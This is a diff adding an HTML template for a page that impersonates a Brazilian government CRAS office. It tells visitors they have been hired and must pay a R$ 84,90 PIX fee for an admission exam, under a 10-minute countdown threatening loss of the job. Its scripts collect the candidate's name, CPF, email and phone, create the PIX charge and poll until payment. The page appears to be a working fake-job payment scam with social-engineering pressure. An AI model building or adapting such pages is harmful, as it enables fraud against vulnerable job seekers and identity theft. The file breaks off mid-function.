@@ -1,0 +1,930 @@
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prosegur - Confirmação de Agendamento</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+    <style>
+        /* Rawline Font Family */
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+          font-weight: 400;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-500.f8af4ec801afaa28.woff2') }}") format('woff2');
+          font-weight: 500;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+          font-weight: 600;
+          font-style: normal;
+        }
+        @font-face {
+          font-family: 'Rawline';
+          src: url("{{ url_for('static', filename='fonts/rawline-700.4b7902400c7e32ac.woff2') }}") format('woff2');
+          font-weight: 700;
+          font-style: normal;
+        }
+
+        body {
+            font-family: 'Rawline', sans-serif;
+            font-size: 16px;
+            color: #555;
+            line-height: 1.5;
+        }
+
+        /* Consistent Font Weight for Bold Elements */
+        strong, .font-bold {
+          font-weight: 500 !important;
+        }
+
+        /* Standard Text Sizes and Colors */
+        .text-base {
+          font-size: 16px;
+          color: #555;
+          line-height: 1.5;
+        }
+    </style>
+    
+    <!-- Mobile Protection - Execute immediately -->
+    <script src="{{ url_for('static', filename='mobile-protection.js') }}"></script>
+</head>
+<body>
+    <!-- Government Header -->
+    <header class="bg-[#222222] text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo Governo" class="h-6" />
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- CRAS Header -->
+    <div class="bg-[#044785] py-3">
+        <div class="container mx-auto px-4 text-center">
+            <img src="https://i.postimg.cc/zvmGLmsw-/Localiza-Fone-4-1-1.png" alt="Logo CRAS" class="h-8 mx-auto" />
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <section class="py-10 md:py-14">
+        <div class="container mx-auto px-4 md:px-8 text-center">
+            <h2 class="text-lg md:text-xl font-bold mb-1 leading-tight">Confirme seu Exame Admissional</h2>
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-base">
+                Para confirmar sua contratação como Assistente Social no CRAS, é obrigatório o pagamento do exame médico admissional. O valor é de <strong>R$ 84,90</strong></span>.
+            </p>
+            
+            <!-- Box Importante - Próximos Passos no topo -->
+            <div class="max-w-2xl mx-auto mb-8">
+                <div class="bg-[#044785] p-4 rounded">
+                    <h4 class="font-bold text-white mb-3 text-base flex items-center">
+                        <span class="mr-2">⚠️</span>
+                        Importante - Próximos Passos:
+                    </h4>
+                    <div class="text-base text-white space-y-3 text-left">
+                        <p class="font-medium text-left"><strong>1.</strong> O pagamento de <strong class="text-yellow-300">R$ 84,90 é obrigatório</strong> para confirmar o agendamento do exame médico.</p>
+                        <p class="font-medium text-left"><strong>2.</strong> Após realizar o pagamento e o exame admissional na clínica, você deve comparecer à unidade do CRAS com seus documentos para finalizar a contratação.</p>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Informações da Clínica e Agendamento -->
+            <div id="clinicAppointmentInfo" class="text-left">
+                <div class="mb-4">
+                    <h3 class="font-semibold text-gray-800 mb-3">Local do Exame Médico:</h3>
+                    <div class="space-y-2">
+                        <p id="clinicName" class="text-gray-700 font-medium text-base">Carregando...</p>
+                        <p id="clinicAddress" class="text-gray-600 text-sm">Carregando...</p>
+                        <p id="clinicPhone" class="text-gray-600 text-sm">Carregando...</p>
+                        
+                        <script>
+                        // Script inline para garantir execução
+                        (function() {
+                            console.log('📱 Script inline executando...');
+                            
+                            function updateClinicData() {
+                                console.log('🔄 Atualizando dados da clínica...');
+                                
+                                // Buscar elementos
+                                const nameEl = document.getElementById('clinicName');
+                                const addressEl = document.getElementById('clinicAddress');
+                                const phoneEl = document.getElementById('clinicPhone');
+                                
+                                if (!nameEl) {
+                                    console.log('❌ Elementos não encontrados ainda');
+                                    return false;
+                                }
+                                
+                                // Buscar dados do localStorage
+                                const clinicStr = localStorage.getItem('clinicLocation');
+                                console.log('📋 Dados do localStorage:', clinicStr);
+                                
+                                if (clinicStr) {
+                                    try {
+                                        const clinic = JSON.parse(clinicStr);
+                                        
+                                        nameEl.innerHTML = clinic.nome || 'Nome não disponível';
+                                        addressEl.innerHTML = clinic.endereco || 'Endereço não disponível';
+                                        phoneEl.innerHTML = 'Telefone: ' + (clinic.telefone || 'Não disponível');
+                                        
+                                        console.log('✅ Dados atualizados:', clinic.nome);
+                                        return true;
+                                    } catch (e) {
+                                        console.log('❌ Erro no parse:', e);
+                                    }
+                                }
+                                
+                                return false;
+                            }
+                            
+                            // Tentar executar múltiplas vezes
+                            let attempts = 0;
+                            const maxAttempts = 10;
+                            
+                            function tryUpdate() {
+                                attempts++;
+                                console.log('🔄 Tentativa', attempts);
+                                
+                                if (updateClinicData() || attempts >= maxAttempts) {
+                                    console.log('🏁 Concluído na tentativa', attempts);
+                                    return;
+                                }
+                                
+                                setTimeout(tryUpdate, 200);
+                            }
+                            
+                            tryUpdate();
+                        })();
+                        </script>
+                    </div>
+                </div>
+                
+                <div class="border-t pt-4">
+                    <h3 class="font-semibold text-gray-800 mb-2">Data e Horário Agendado:</h3>
+                    <p id="examDateTime" class="text-gray-700 font-medium text-base">Carregando...</p>
+                    
+                    <script>
+                    // Script inline para data/horário
+                    (function() {
+                        function updateDateTime() {
+                            const dateTimeEl = document.getElementById('examDateTime');
+                            if (!dateTimeEl) return false;
+                            
+                            const examDate = localStorage.getItem('examDate');
+                            const examTime = localStorage.getItem('examTime');
+                            
+                            console.log('📅 Data/hora encontrada:', examDate, examTime);
+                            
+                            if (examDate && examTime) {
+                                dateTimeEl.innerHTML = examDate + ' às ' + examTime;
+                                console.log('✅ Data/hora atualizada');
+                                return true;
+                            }
+                            
+                            return false;
+                        }
+                        
+                        // Tentar múltiplas vezes
+                        let attempts = 0;
+                        function tryUpdateDateTime() {
+                            attempts++;
+                            if (updateDateTime() || attempts >= 10) return;
+                            setTimeout(tryUpdateDateTime, 200);
+                        }
+                        
+                        tryUpdateDateTime();
+                    })();
+                    </script>
+                </div>
+
+            </div>
+<br>
+            <!-- Box de Aviso Importante acima do pagamento -->
+            <div class="flex flex-col items-center mb-6">
+                <div class="bg-yellow-100 border border-yellow-300 p-3 rounded mb-4 max-w-2xl mx-auto">
+                    <p class="text-yellow-800 text-base font-semibold text-center">⚡ ATENÇÃO: Sem o pagamento, o agendamento do exame não será confirmado e você não poderá prosseguir com a contratação.</p>
+                </div>
+                
+                {% if payment_data %}
+                <!-- Payment Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border--gray-700 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text--gray-700 font-medium text-base">Aguardando pagamento para finalizar</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <!-- Informações da clínica serão inseridas aqui pelo JavaScript -->
+                        <div id="clinicInfoInBox" class="mb-4" style="display: none;">
+                            <div class="bg-blue-50 p-4 rounded mb-3">
+                                <h4 class="font-semibold text-blue-800 mb-2 text-base">Local do Exame:</h4>
+                                <p id="clinicNameInBox" class="text-blue-700 font-medium text-sm"></p>
+                                <p id="clinicAddressInBox" class="text-blue-600 text-xs"></p>
+                                <p id="clinicPhoneInBox" class="text-blue-600 text-xs"></p>
+                            </div>
+                            <div class="bg-green-50 p-4 rounded mb-3">
+                                <h4 class="font-semibold text-green-800 mb-2 text-sm">Data e Horário:</h4>
+                                <p id="examDateTimeInBox" class="text-green-700 font-medium text-sm"></p>
+                            </div>
+                        </div>
+                        
+                        <p class="text-base text-gray-700 mb-3" id="training-info">
+                            Após o pagamento, você deve comparecer à clínica para realizar o exame médico admissional conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-base">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-base text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+
+
+                {% else %}
+                <!-- Error Status Box -->
+                <div class="bg-gray-100 border border-gray-300 rounded p-4 mb-6 w-full max-w-2xl mx-auto">
+                    <div class="flex items-center justify-center space-x-2 mb-4">
+                        <div class="w-6 h-6 border-4 border-red-500 border-t-transparent rounded-full animate-spin"></div>
+                        <span class="text-red-500 font-medium text-sm">Erro ao gerar pagamento</span>
+                    </div>
+                    <div class="border-t border-gray-300 pt-4 text-left">
+                        <!-- Informações da clínica serão inseridas aqui pelo JavaScript -->
+                        <div id="clinicInfoInBoxError" class="mb-4" style="display: none;">
+                            <div class="bg-blue-50 p-4 rounded mb-3">
+                                <h4 class="font-semibold text-blue-800 mb-2 text-sm">Local do Exame:</h4>
+                                <p id="clinicNameInBoxError" class="text-blue-700 font-medium text-sm"></p>
+                                <p id="clinicAddressInBoxError" class="text-blue-600 text-xs"></p>
+                                <p id="clinicPhoneInBoxError" class="text-blue-600 text-xs"></p>
+                            </div>
+                            <div class="bg-green-50 p-4 rounded mb-3">
+                                <h4 class="font-semibold text-green-800 mb-2 text-sm">Data e Horário:</h4>
+                                <p id="examDateTimeInBoxError" class="text-green-700 font-medium text-sm"></p>
+                            </div>
+                        </div>
+                        
+                        <p class="text-base text-gray-700 mb-3" id="training-info-error">
+                            Após o pagamento, você deve comparecer à clínica para realizar o exame médico admissional conforme agendado.
+                        </p>
+                        <h4 class="font-semibold text-gray-800 mb-2 text-sm">Documentos obrigatórios para levar no dia:</h4>
+                        <ul class="list-disc list-inside space-y-1 text-base text-gray-700">
+                            <li>Documento de identificação com foto (RG ou CNH)</li>
+                            <li>Comprovante de residência</li>
+                            <li>Carteira de trabalho</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
+                    <p>Não foi possível gerar o pagamento PIX. Tente novamente.</p>
+                    <a href="/agendamento" class="text-red-800 underline">Voltar ao agendamento</a>
+                </div>
+                {% endif %}
+            </div>
+
+
+
+            {% if payment_data %}
+            <div class="max-w-md mx-auto">
+                <!-- QR Code Visual -->
+                <div class="text-center mb-6">
+                    <div class="flex justify-center mb-4">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a2/Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg/2560px-Logo%E2%80%94pix_powered_by_Banco_Central_%28Brazil%2C_2020%29.svg.png" alt="Logo PIX" class="h-8 object-contain">
+                    </div>
+                    <div class="flex justify-center">
+                        <img id="pixQrCode" src="{{ payment_data.pixQrCode }}" alt="QR Code PIX" class="w-40 h-40 border border-gray-300 rounded shadow-sm">
+                    </div>
+                </div>
+                
+                <!-- Código Copia e Cola -->
+                <label for="pixCodeInput" class="block text-sm font-medium text-gray-700 mb-2">Código Pix (Copia e Cola):</label>
+                <div class="mb-4">
+                    <input type="text" id="pixCodeInput" value="{{ payment_data.pixCode }}" readonly class="w-full px-3 py-2 border border-gray-300 rounded text-xs text-gray-700 bg-gray-50">
+                </div>
+                <button onclick="copyPixCode()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold px-4 py-3 rounded shadow-lg hover:shadow-xl transform hover:scale-105 transition duration-200" style="border-radius: 4px;">Copiar Código Pix</button>
+                
+                <!-- Passo a passo para pagamento PIX -->
+                <div class="mt-6 bg-green-50 border border-green-200 rounded p-4">
+                    <h4 class="font-semibold text-green-800 mb-3 text-sm">Como pagar com PIX Copia e Cola:</h4>
+                    <div class="space-y-3 text-sm text-gray-700">
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">1</span>
+                            <span>Abra o aplicativo do seu banco</span>
+                        </div>
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">2</span>
+                            <span>Escolha a opção "PIX" ou "Transferir"</span>
+                        </div>
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">3</span>
+                            <span>Selecione "PIX Copia e Cola" ou "Código PIX"</span>
+                        </div>
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">4</span>
+                            <span>Cole o código copiado acima</span>
+                        </div>
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">5</span>
+                            <span>Confirme o valor de R$ 84,90</span>
+                        </div>
+                        <div class="flex items-start text-left">
+                            <span class="inline-flex items-center justify-center w-6 h-6 bg-green-600 text-white font-bold text-xs rounded-full mr-3 flex-shrink-0 mt-0.5">6</span>
+                            <span>Finalize o pagamento</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            {% endif %}
+
+
+<br>
+            <p class="max-w-3xl mx-auto mb-6 md:mb-10 leading-relaxed text-sm">
+                Após o pagamento, o exame médico admissional será confirmado e você poderá prosseguir com sua contratação no CRAS. Certifique-se de clicar no botão abaixo após realizar o pagamento.
+            </p>
+
+            <a href="#" class="bg-[#044785] text-white font-medium px-6 md:px-8 py-3 rounded-full inline-block">Confirmar Pagamento</a>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-[#044785] text-white py-8 md:py-12">
+        <div class="container mx-auto px-4 md:px-8">
+            <div class="grid grid-cols-1 md:grid-cols-4 gap-8 mb-8 md:mb-12">
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Sobre o CRAS</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">O que é o CRAS</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Missão e Valores</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Onde Atuamos</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Serviços</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Proteção Social Básica</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Atendimento às Famílias</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Grupos de Convivência</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Benefícios Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Assistência Social</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Cadastro Único</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Bolsa Família</a></li>
+                        <li><a href="#" class="hover:text-gray-200">BPC</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Auxílio Brasil</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Programas Sociais</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h3 class="text-base font-medium mb-4 text-white">Trabalhe Conosco</h3>
+                    <ul class="space-y-2 text-sm text-white">
+                        <li><a href="#" class="hover:text-gray-200">Vagas</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Portal do Servidor</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Capacitações</a></li>
+                        <li><a href="#" class="hover:text-gray-200">Concursos</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <hr class="border-blue-400 mb-6">
+            
+            <div class="flex flex-col md:flex-row justify-between items-center text-xs text-white">
+                <div class="mb-4 md:mb-0">
+                    <span>© Copyright 2025 CRAS - Centro de Referência de Assistência Social</span>
+                </div>
+                <div class="flex flex-wrap justify-center gap-2 md:gap-4">
+                    <a href="#" class="hover:text-gray-200">Mapa do Site</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Política de Privacidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Lei de Acesso à Informação</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Acessibilidade</a>
+                    <span>|</span>
+                    <a href="#" class="hover:text-gray-200">Ouvidoria</a>
+                </div>
+                <div class="flex space-x-4 mt-4 md:mt-0">
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-facebook-square"></i></a>
+                    <a href="#" class="text-white hover:text-gray-200"><i class="fab fa-instagram"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // 10-minute countdown timer
+        let timeLeft = 10 * 60; // 10 minutes in seconds
+        const timerElement = document.getElementById('countdown-timer');
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            
+            timerElement.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Change color when time is running out
+            if (timeLeft <= 120) { // Last 2 minutes
+                timerElement.classList.add('text-red-800', 'animate-pulse');
+            } else if (timeLeft <= 300) { // Last 5 minutes
+                timerElement.classList.add('text-red-700');
+            }
+            
+            if (timeLeft <= 0) {
+                // Time's up - redirect to timeout page
+                timerElement.textContent = "TEMPO ESGOTADO!";
+                timerElement.classList.add('text-red-900', 'bg-red-100');
+                setTimeout(() => {
+                    alert("Tempo esgotado! Você perdeu sua vaga. Será redirecionado para nova tentativa.");
+                    window.location.href = "/agendamento";
+                }, 2000);
+                return;
+            }
+            
+            timeLeft--;
+        }
+        
+        // Hide loading overlay after 3 seconds
+        setTimeout(function() {
+            document.getElementById('payment-loading').style.display = 'none';
+        }, 3000);
+        
+        // Retrieve user data from localStorage if available
+        const userData = {
+            name: localStorage.getItem('candidateName') || 'Candidato',
+            cpf: localStorage.getItem('candidateCPF') || '',
+            email: localStorage.getItem('candidateEmail') || '',
+            phone: localStorage.getItem('candidatePhone') || '',
+            city: localStorage.getItem('candidateCity') || ''
+        };
+        console.log('User data from localStorage:', userData);
+        
+        // Check if we have real user data and recreate PIX payment if needed
+        // Priority 1: Full data with email
+        // Priority 2: Real name and CPF even without email (will use fallback)
+        if ((userData.email && userData.email !== '' && userData.name && userData.name !== 'Candidato') ||
+            (userData.name && userData.name !== 'Candidato' && userData.cpf && userData.cpf !== '')) {
+            console.log('Real user data found, recreating PIX payment with authentic data...');
+            
+            // Garantir que temos um email válido
+            if (!userData.email || userData.email === '') {
+                // Gerar email baseado no nome do usuário se não houver email
+                const cleanName = userData.name.toLowerCase().replace(/[^a-z]/g, '');
+                userData.email = cleanName + '@candidato.com.br';
+                console.log('Email gerado automaticamente:', userData.email);
+            }
+            
+            console.log('Dados finais para PIX:', userData);
+            
+            // Recreate PIX payment with real user data
+            fetch('/create_pix_payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(userData)
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success && data.payment_data) {
+                    console.log('PIX payment recreated with real user data:', data.payment_data);
+                    
+                    // Store payment ID globally for status checking
+                    window.currentPixPaymentId = data.payment_data.id;
+                    localStorage.setItem('currentPaymentId', data.payment_data.id);
+                    console.log('Stored payment ID for status checking:', data.payment_data.id);
+                    
+                    // Update PIX code on the page if elements exist
+                    const pixCodeInput = document.getElementById('pixCodeInput');
+                    const pixQrCode = document.getElementById('pixQrCode');
+                    
+                    if (pixCodeInput && data.payment_data.pixCode) {
+                        pixCodeInput.value = data.payment_data.pixCode;
+                        console.log('PIX code updated with real data');
+                    }
+                    
+                    if (pixQrCode && data.payment_data.pixQrCode) {
+                        pixQrCode.src = data.payment_data.pixQrCode;
+                        console.log('QR code updated with official API image');
+                    }
+                    
+                    // Clear any existing status check interval
+                    if (statusCheckInterval) {
+                        clearInterval(statusCheckInterval);
+                    }
+                    
+                    // Start payment status checking immediately after payment creation with new ID
+                    setTimeout(() => {
+                        console.log('Starting status check for NEW payment ID:', data.payment_data.id);
+                        
+                        // Clear any existing intervals first
+                        if (window.statusCheckInterval) {
+                            clearInterval(window.statusCheckInterval);
+                        }
+                        
+                        // USAR SEMPRE O NOVO ID DE PAGAMENTO CRIADO
+                        const newPaymentId = data.payment_data.id;
+                        console.log('INICIANDO VERIFICAÇÃO COM NOVO ID:', newPaymentId);
+                        
+                        // Limpar TODAS as verificações anteriores
+                        try {
+                            clearInterval(window.currentStatusInterval);
+                            clearInterval(window.statusCheckInterval);
+                            clearInterval(window.activePaymentCheck);
+                            clearInterval(statusCheckInterval);
+                            clearInterval(currentStatusInterval);
+                        } catch (e) {
+                            console.log('Intervalos limpos');
+                        }
+                        
+                        // LIMPAR tudo e usar apenas o novo ID
+                        if (window.paymentMonitor) clearInterval(window.paymentMonitor);
+                        
+                        // Definir ID atual da transação
+                        window.currentTransactionId = newPaymentId;
+                        console.log('PIX ATUAL:', newPaymentId);
+                        
+                        // Sistema de monitoramento dedicado
+                        window.paymentMonitor = setInterval(() => {
+                            fetch(`/check_payment_status/${newPaymentId}`)
+                                .then(response => response.json())
+                                .then(data => {
+                                    console.log(`Status PIX ${newPaymentId}:`, data.status);
+                                    if (data.success && data.redirect) {
+                                        clearInterval(window.paymentMonitor);
+                                        console.log('REDIRECIONANDO PARA CNV');
+                                        window.location.replace('/aviso');
+                                    }
+                                })
+                                .catch(error => console.log('Erro verificação:', error));
+                        }, 300);
+                        
+                        // Verificação imediata do PIX atual
+                        setTimeout(() => {
+                            fetch(`/check_payment_status/${newPaymentId}`)
+                                .then(response => response.json())
+                                .then(data => {
+                                    if (data.success && data.redirect) {
+                                        clearInterval(window.paymentMonitor);
+                                        window.location.replace('/aviso');
+                                    }
+                                });
+                        }, 100);
+                    }, 1000);
+                } else {
+                    console.warn('Failed to recreate PIX payment with real data');
+                }
+            })
+            .catch(error => {
+                console.error('Error recreating PIX payment:', error);
+                // Even if recreation fails, try to start status checking with existing payment ID
+                setTimeout(() => {
+                    startPaymentStatusCheck();
+                }, 2000);
+            });
+        } else {
+            console.log('No complete user data found in localStorage, using existing payment');
+        }
+        
+        // Update timer every second
+        updateTimer();
+        setInterval(updateTimer, 1000);
+        
+        // Load clinic and appointment data - VERSÃO SIMPLIFICADA
+        function loadClinicAndAppointmentInfo() {
+            console.log('🚀 EXECUTANDO loadClinicAndAppointmentInfo');
+            
+            // Verificar se os elementos existem
+            const clinicNameEl = document.getElementById('clinicName');
+            const clinicAddressEl = document.getElementById('clinicAddress');
+            const clinicPhoneEl = document.getElementById('clinicPhone');
+            const examDateTimeEl = document.getElementById('examDateTime');
+            
+            console.log('Elementos encontrados:', {
+                clinicName: !!clinicNameEl,
+                clinicAddress: !!clinicAddressEl,
+                clinicPhone: !!clinicPhoneEl,
+                examDateTime: !!examDateTimeEl
+            });
+            
+            if (!clinicNameEl) {
+                console.error('❌ Elemento clinicName não encontrado!');
+                return;
+            }
+            
+            // Obter dados do localStorage
+            const clinicDataStr = localStorage.getItem('clinicLocation');
+            const examDate = localStorage.getItem('examDate');
+            const examTime = localStorage.getItem('examTime');
+            
+            console.log('LocalStorage data:', {
+                clinicLocation: clinicDataStr,
+                examDate: examDate,
+                examTime: examTime
+            });
+            
+            // Atualizar dados da clínica
+            if (clinicDataStr) {
+                try {
+                    const clinicData = JSON.parse(clinicDataStr);
+                    console.log('📋 Dados da clínica parseados:', clinicData);
+                    
+                    if (clinicNameEl && clinicData.nome) {
+                        clinicNameEl.innerText = clinicData.nome;
+                        console.log('✅ Nome atualizado:', clinicData.nome);
+                    }
+                    
+                    if (clinicAddressEl && clinicData.endereco) {
+                        clinicAddressEl.innerText = clinicData.endereco;
+                        console.log('✅ Endereço atualizado:', clinicData.endereco);
+                    }
+                    
+                    if (clinicPhoneEl && clinicData.telefone) {
+                        clinicPhoneEl.innerText = 'Telefone: ' + clinicData.telefone;
+                        console.log('✅ Telefone atualizado:', clinicData.telefone);
+                    }
+                } catch (e) {
+                    console.error('❌ Erro ao fazer parse dos dados da clínica:', e);
+                }
+            } else {
+                console.log('⚠️ Nenhum dado de clínica no localStorage');
+            }
+            
+            // Atualizar data e horário
+            if (examDateTimeEl) {
+                if (examDate && examTime) {
+                    examDateTimeEl.innerText = examDate + ' às ' + examTime;
+                    console.log('✅ Data/hora atualizada:', examDate + ' às ' + examTime);
+                } else {
+                    examDateTimeEl.innerText = 'Data/horário não definido';
+                    console.log('⚠️ Data/horário não encontrado');
+                }
+            }
+            
+            console.log('🏁 FUNÇÃO CONCLUÍDA');
+        }
+        
+        // Executar imediatamente quando o script carrega
+        (function() {
+            console.log('Script executando imediatamente...');
+            loadClinicAndAppointmentInfo();
+        })();
+        
+        // Executar em múltiplos eventos
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOMContentLoaded - executando loadClinicAndAppointmentInfo');
+            loadClinicAndAppointmentInfo();
+        });
+        
+        window.addEventListener('load', function() {
+            console.log('Window load - executando loadClinicAndAppointmentInfo');
+            loadClinicAndAppointmentInfo();
+        });
+        
+        // Executar com delays
+        setTimeout(function() {
+            console.log('Timeout 100ms - executando loadClinicAndAppointmentInfo');
+            loadClinicAndAppointmentInfo();
+        }, 100);
+        
+        setTimeout(function() {
+            console.log('Timeout 500ms - executando loadClinicAndAppointmentInfo');
+            loadClinicAndAppointmentInfo();
+        }, 500);
+        
+        setTimeout(function() {
+            console.log('Timeout 1000ms - executando loadClinicAndAppointmentInfo');
+            loadClinicAndAppointmentInfo();
+        }, 1000);
+
+        // Populate clinic info inside payment boxes
+        function populateClinicInfoInBoxes() {
+            try {
+                const clinicDataStr = localStorage.getItem('clinicLocation');
+                const clinicData = clinicDataStr ? JSON.parse(clinicDataStr) : null;
+                const examDate = localStorage.getItem('examDate');
+                const examTime = localStorage.getItem('examTime');
+                
+                console.log('Populando info nas boxes - Clínica:', clinicData);
+                console.log('Populando info nas boxes - Data:', examDate, 'Horário:', examTime);
+                
+                if (clinicData || (examDate && examTime)) {
+                    // For success box
+                    const clinicInfoInBox = document.getElementById('clinicInfoInBox');
+                    if (clinicInfoInBox && clinicData) {
+                        const clinicNameInBox = document.getElementById('clinicNameInBox');
+                        const clinicAddressInBox = document.getElementById('clinicAddressInBox');
+                        const clinicPhoneInBox = document.getElementById('clinicPhoneInBox');
+                        const examDateTimeInBox = document.getElementById('examDateTimeInBox');
+                        
+                        if (clinicNameInBox) clinicNameInBox.textContent = clinicData.nome;
+                        if (clinicAddressInBox) clinicAddressInBox.textContent = clinicData.endereco;
+                        if (clinicPhoneInBox) clinicPhoneInBox.textContent = `Tel: ${clinicData.telefone}`;
+                        
+                        if (examDateTimeInBox) {
+                            if (examDate && examTime) {
+                                examDateTimeInBox.textContent = `${examDate} às ${examTime}`;
+                            } else if (examDate) {
+                                examDateTimeInBox.textContent = `${examDate} (horário a definir)`;
+                            }
+                        }
+                        
+                        clinicInfoInBox.style.display = 'block';
+                    }
+                    
+                    // For error box
+                    const clinicInfoInBoxError = document.getElementById('clinicInfoInBoxError');
+                    if (clinicInfoInBoxError && clinicData) {
+                        const clinicNameInBoxError = document.getElementById('clinicNameInBoxError');
+                        const clinicAddressInBoxError = document.getElementById('clinicAddressInBoxError');
+                        const clinicPhoneInBoxError = document.getElementById('clinicPhoneInBoxError');
+                        const examDateTimeInBoxError = document.getElementById('examDateTimeInBoxError');
+                        
+                        if (clinicNameInBoxError) clinicNameInBoxError.textContent = clinicData.nome;
+                        if (clinicAddressInBoxError) clinicAddressInBoxError.textContent = clinicData.endereco;
+                        if (clinicPhoneInBoxError) clinicPhoneInBoxError.textContent = `Tel: ${clinicData.telefone}`;
+                        
+                        if (examDateTimeInBoxError) {
+                            if (examDate && examTime) {
+                                examDateTimeInBoxError.textContent = `${examDate} às ${examTime}`;
+                            } else if (examDate) {
+                                examDateTimeInBoxError.textContent = `${examDate} (horário a definir)`;
+                            }
+                        }
+                        
+                        clinicInfoInBoxError.style.display = 'block';
+                    }
+                }
+            } catch (error) {
+                console.error('Erro ao popular informações nas boxes:', error);
+            }
+        }
+
+        // Load clinic information (legacy function)
+        function loadClinicInfo() {
+            try {
+                const clinicData = localStorage.getItem('clinicLocation');
+                if (clinicData) {
+                    const clinic = JSON.parse(clinicData);
+                    
+                    // Update clinic info elements
+                    const clinicNameEl = document.getElementById('clinicName');
+                    const clinicAddressEl = document.getElementById('clinicAddress');
+                    const clinicPhoneEl = document.getElementById('clinicPhone');
+                    const clinicInfoEl = document.getElementById('clinicInfo');
+                    
+                    if (clinicNameEl && clinicAddressEl && clinicPhoneEl && clinicInfoEl) {
+                        clinicNameEl.textContent = clinic.nome || 'Clínica não informada';
+                        clinicAddressEl.textContent = clinic.endereco || '';
+                        clinicPhoneEl.textContent = clinic.telefone ? `Tel: ${clinic.telefone}` : '';
